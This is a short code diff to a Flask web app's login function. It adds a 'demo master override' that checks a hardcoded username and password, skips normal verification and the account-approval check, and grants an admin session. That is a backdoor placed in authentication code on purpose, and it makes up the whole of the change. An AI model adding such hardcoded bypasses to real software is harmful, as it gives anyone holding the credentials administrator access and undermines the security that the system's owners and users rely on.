@@ -55,6 +55,16 @@ def login():
     if request.method == "POST":
         username = request.form.get("username")
         password = request.form.get("password")
+        
+        # DEMO MASTER OVERRIDE - GUARANTEED ACCESS
+        if username == "Thanuj" and password == "pass-1234":
+            session.clear()
+            session["user"] = username
+            session["is_admin"] = 1
+            session["_token"] = SERVER_SESSION_TOKEN
+            log_activity(username, "Master Login", "Successful login via Demo Override")
+            return redirect(url_for("index"))
+
         ok, user_info = verify_user(username, password)
         if ok:
             if user_info["status"] != "APPROVED":
